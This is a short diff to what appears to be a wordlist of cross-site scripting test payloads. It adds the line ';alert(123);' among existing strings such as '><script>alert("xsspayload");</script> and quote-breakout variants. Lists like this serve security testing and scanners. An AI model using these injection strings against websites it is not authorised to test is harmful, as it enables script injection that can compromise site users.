@@ -9,6 +9,7 @@
 '><script>alert("xsspayload");</script>
 '"`>xsspayload<script>alert("xsspayload");</script>
 
+';alert(123);'
 ';alert(123);//
 ";alert(123);//
 `;alert(123);//
